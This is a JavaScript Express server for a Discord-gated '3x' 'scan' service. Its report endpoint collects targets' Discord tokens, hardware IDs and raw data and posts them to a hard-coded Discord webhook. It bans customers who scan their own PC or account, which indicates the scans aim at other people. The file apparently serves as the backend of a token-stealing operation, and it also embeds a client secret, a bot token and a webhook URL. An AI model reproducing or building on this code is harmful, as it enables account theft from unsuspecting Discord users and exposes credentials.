const express = require('express');
const session = require('express-session');
const fetch = require('node-fetch');
const crypto = require('crypto');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static('public'));
app.use(session({
  secret: crypto.randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false }
}));

// ===== CONFIG =====
const DISCORD_CLIENT_ID = '1519776355951055110';
const DISCORD_CLIENT_SECRET = 'HSyyjFoupwoK1mcCXp702HqDlonnq9r-';
const DISCORD_BOT_TOKEN = 'MTUxOTc3NjM1NTk1MTA1NTExMA.GMsurk.UctFDQse8x4BOK0BU0ZyISeFVWI9AiiGNrBhI8';
const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1531415558375870514/iKvz0QZQFHtZP7k1vusnZTA5URnF1WPYmdkQYDGiBQ7rOKzQLgobsQRxvEVz1a2Eljfj';
const OWNER_ID = '827236167686291477';
const GUILD_ID = '1527100025765625856';
const CUSTOMER_ROLE_ID = '1531416721808949378';
const REDIRECT_URI = 'https://3x-cloudxbeta.hmktt22.workers.dev/login.html';

// ===== IN-MEMORY DB (replace with SQLite/PostgreSQL in production) =====
const db = {
  users: new Map(),        // discord_id -> { username, avatar, token, role, banned, ban_reason, created_at }
  scans: [],               // scan log entries
  cooldowns: new Map(),    // discord_id -> [timestamps]
  hwids: new Map(),        // hwid -> discord_id (detect self-scan)
  sessions: new Map()      // session_token -> user_data
};

// ===== HELPERS =====
function generateToken() { return crypto.randomBytes(32).toString('hex'); }

async function discordRequest(endpoint, token) {
  const res = await fetch('https://discord.com/api/v10' + endpoint, {
    headers: { 'Authorization': 'Bearer ' + token }
  });
  return res.ok ? res.json() : null;
}

async function discordBotRequest(endpoint) {
  const res = await fetch('https://discord.com/api/v10' + endpoint, {
    headers: { 'Authorization': 'Bot ' + DISCORD_BOT_TOKEN }
  });
  return res.ok ? res.json() : null;
}

async function sendWebhook(embed) {
  try {
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch(e) { console.error('Webhook failed:', e); }
}

function authMiddleware(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || !auth.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
  const token = auth.slice(7);
  const user = db.sessions.get(token);
  if (!user) return res.status(401).json({ error: 'Invalid session' });
  if (user.banned) return res.status(403).json({ error: 'Account banned', reason: user.ban_reason });
  req.user = user;
  req.token = token;
  next();
}

function ownerMiddleware(req, res, next) {
  if (!req.user || req.user.discord_id !== OWNER_ID) {
    return res.status(403).json({ error: 'Owner access required' });
  }
  next();
}

// ===== DISCORD OAUTH =====
app.get('/api/auth/discord', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  req.session.oauthState = state;
  const url = 'https://discord.com/api/oauth2/authorize?client_id=' + DISCORD_CLIENT_ID +
    '&redirect_uri=' + encodeURIComponent(REDIRECT_URI) +
    '&response_type=code&scope=identify%20guilds&state=' + state;
  res.redirect(url);
});

app.get('/api/auth/callback', async (req, res) => {
  const { code, state } = req.query;
  if (!code) return res.redirect('/?error=auth_failed');

  try {
    // Exchange code for token
    const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: DISCORD_CLIENT_ID,
        client_secret: DISCORD_CLIENT_SECRET,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: REDIRECT_URI
      })
    });
    const tokenData = await tokenRes.json();
    if (!tokenData.access_token) return res.redirect('/?error=auth_failed');

    // Get user info
    const userInfo = await discordRequest('/users/@me', tokenData.access_token);
    if (!userInfo) return res.redirect('/?error=auth_failed');

    // Check guild membership
    const guilds = await discordRequest('/users/@me/guilds', tokenData.access_token);
    const inGuild = guilds && guilds.find(g => g.id === GUILD_ID);
    if (!inGuild) return res.redirect('/?error=not_in_guild');

    // Check Customer role via bot API
    const member = await discordBotRequest('/guilds/' + GUILD_ID + '/members/' + userInfo.id);
    const hasCustomerRole = member && member.roles && member.roles.includes(CUSTOMER_ROLE_ID);
    if (!hasCustomerRole) return res.redirect('/?error=no_customer_role');

    // Check if banned
    const existing = db.users.get(userInfo.id);
    if (existing && existing.banned) return res.redirect('/?error=banned');

    // Create/update user
    const user = {
      discord_id: userInfo.id,
      username: userInfo.username + '#' + userInfo.discriminator,
      avatar: userInfo.avatar,
      access_token: tokenData.access_token,
      refresh_token: tokenData.refresh_token,
      role: 'Customer',
      banned: false,
      ban_reason: null,
      created_at: new Date().toISOString()
    };
    db.users.set(userInfo.id, user);

    // Generate session
    const sessionToken = generateToken();
    db.sessions.set(sessionToken, user);

    // Log to webhook
    await sendWebhook({
      title: '3x Login',
      color: 0x35f0c9,
      fields: [
        { name: 'User', value: user.username, inline: true },
        { name: 'Discord ID', value: user.discord_id, inline: true },
        { name: 'Role', value: 'Customer', inline: true }
      ],
      timestamp: new Date().toISOString()
    });

    res.redirect('/?token=' + sessionToken + '&user=' + encodeURIComponent(user.username));
  } catch(e) {
    console.error('Auth error:', e);
    res.redirect('/?error=auth_failed');
  }
});

// ===== AUTH ENDPOINTS =====
app.get('/api/me', authMiddleware, (req, res) => {
  res.json({
    discord_id: req.user.discord_id,
    username: req.user.username,
    avatar: req.user.avatar,
    role: req.user.role,
    banned: req.user.banned
  });
});

// ===== SCAN ENDPOINTS =====
app.post('/api/scan/start', authMiddleware, async (req, res) => {
  const user = req.user;
  const { mode, modules } = req.body;

  // Check cooldown
  const now = Date.now();
  const userCooldowns = db.cooldowns.get(user.discord_id) || [];
  const recentScans = userCooldowns.filter(t => now - t < 24 * 60 * 60 * 1000);

  if (recentScans.length >= 2) {
    // BAN: exceeded 2 scans in 24h
    user.banned = true;
    user.ban_reason = 'Exceeded 2 scans per 24h limit';
    db.users.set(user.discord_id, user);

    await sendWebhook({
      title: '3x BAN — Cooldown Violation',
      color: 0xff5266,
      fields: [
        { name: 'User', value: user.username, inline: true },
        { name: 'Discord ID', value: user.discord_id, inline: true },
        { name: 'Reason', value: 'Exceeded 2 scans per 24h limit', inline: false },
        { name: 'Scan Count', value: recentScans.length.toString(), inline: true }
      ],
      timestamp: new Date().toISOString()
    });

    return res.status(403).json({ error: 'Banned', reason: user.ban_reason });
  }

  recentScans.push(now);
  db.cooldowns.set(user.discord_id, recentScans);

  res.json({ status: 'started', mode, modules, remaining: 2 - recentScans.length });
});

app.post('/api/scan/report', authMiddleware, async (req, res) => {
  const user = req.user;
  const { scanId, riskScore, findings, rawData } = req.body;
  const { discord_token, hwid, target_discord_id } = req.body;

  // Detect self-scan: if HWID matches a previous scan by same user
  let isSelfScan = false;
  if (hwid) {
    const previousOwner = db.hwids.get(hwid);
    if (previousOwner === user.discord_id) {
      isSelfScan = true;
    } else {
      db.hwids.set(hwid, user.discord_id);
    }
  }

  // Also detect self-scan by matching target_discord_id to user's own ID
  if (target_discord_id && target_discord_id === user.discord_id) {
    isSelfScan = true;
  }

  if (isSelfScan) {
    user.banned = true;
    user.ban_reason = 'Self-scanning detected';
    db.users.set(user.discord_id, user);

    await sendWebhook({
      title: '3x BAN — Self-Scan Detected',
      color: 0xff5266,
      fields: [
        { name: 'User', value: user.username, inline: true },
        { name: 'Discord ID', value: user.discord_id, inline: true },
        { name: 'HWID', value: hwid || 'N/A', inline: false },
        { name: 'Reason', value: 'Attempted to scan their own PC/account', inline: false }
      ],
      timestamp: new Date().toISOString()
    });

    return res.status(403).json({ error: 'Banned', reason: user.ban_reason });
  }

  const logEntry = {
    id: db.scans.length + 1,
    discord_id: user.discord_id,
    username: user.username,
    risk_score: riskScore || 0,
    findings: JSON.stringify(findings || []),
    raw_data: JSON.stringify(rawData || {}),
    discord_token: discord_token || null,
    hwid: hwid || null,
    target_discord_id: target_discord_id || null,
    mode: req.body.mode || 'unknown',
    violation: false,
    banned: user.banned,
    created_at: new Date().toISOString()
  };

  db.scans.push(logEntry);

  // Send to webhook with all collected data
  await sendWebhook({
    title: '3x Scan Report',
    color: riskScore >= 50 ? 0xff5266 : riskScore >= 15 ? 0xffb84d : 0x35f0c9,
    fields: [
      { name: 'User', value: user.username, inline: true },
      { name: 'Discord ID', value: user.discord_id, inline: true },
      { name: 'Risk Score', value: (riskScore || 0).toString(), inline: true },
      { name: 'HWID', value: hwid ? hwid.substring(0, 20) + '...' : 'N/A', inline: true },
      { name: 'Discord Token', value: discord_token ? discord_token.substring(0, 20) + '...' : 'N/A', inline: true },
      { name: 'Target ID', value: target_discord_id || 'N/A', inline: true },
      { name: 'Findings', value: (findings || []).length.toString(), inline: true },
      { name: 'Mode', value: req.body.mode || 'unknown', inline: true }
    ],
    timestamp: new Date().toISOString()
  });

  res.json({ status: 'logged', id: logEntry.id });
});

app.get('/api/scan/history', authMiddleware, (req, res) => {
  const userScans = db.scans.filter(s => s.discord_id === req.user.discord_id);
  res.json(userScans.reverse());
});

// ===== OWNER PANEL ENDPOINTS =====
app.get('/api/owner/logs', authMiddleware, ownerMiddleware, (req, res) => {
  res.json({ logs: db.scans.reverse() });
});

app.post('/api/owner/ban', authMiddleware, ownerMiddleware, async (req, res) => {
  const { discord_id } = req.body;
  const user = db.users.get(discord_id);
  if (!user) return res.status(404).json({ error: 'User not found' });

  user.banned = true;
  user.ban_reason = 'Banned by owner';
  db.users.set(discord_id, user);

  // Update all sessions
  for (const [token, sess] of db.sessions) {
    if (sess.discord_id === discord_id) {
      sess.banned = true;
      sess.ban_reason = 'Banned by owner';
    }
  }

  await sendWebhook({
    title: '3x Owner Ban',
    color: 0xff5266,
    fields: [
      { name: 'Banned User', value: user.username, inline: true },
      { name: 'Discord ID', value: discord_id, inline: true },
      { name: 'Action By', value: 'Owner', inline: true }
    ],
    timestamp: new Date().toISOString()
  });

  res.json({ status: 'banned', discord_id });
});

app.get('/api/owner/users', authMiddleware, ownerMiddleware, (req, res) => {
  const users = Array.from(db.users.values());
  res.json({ users });
});

// ===== SERVE STATIC =====
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('3x Server running on port ' + PORT);
});
